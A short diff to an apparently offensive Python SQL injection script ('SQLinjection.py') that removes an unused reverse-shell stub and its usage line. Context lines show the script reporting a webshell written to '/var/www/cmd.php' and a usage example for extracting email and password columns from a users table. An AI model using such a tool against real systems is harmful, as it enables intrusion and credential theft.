@@ -55,9 +55,6 @@ def command_execution():
     enviar_payload(payload)
     print("Tu webshell ha sido enviada exitosamente a '/var/www/cmd.php. :)")
 
-def reverse_shell():
-    pass
-
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
@@ -65,9 +62,7 @@ if __name__ == "__main__":
 
      Data exfiltration: python3 SQLinjection.py --dbs ch16 --table users --columns email,pass --extract 
 
-     Python3 SQLinjection.py cmd-shell (You know what it is :)
-     
-     Python3 SQLinjection.py reverse-shell IP Port""")
+     Python3 SQLinjection.py cmd-shell (You know what it is :)""")
         sys.exit(1)
 
     if sys.argv[1] == "dbs":
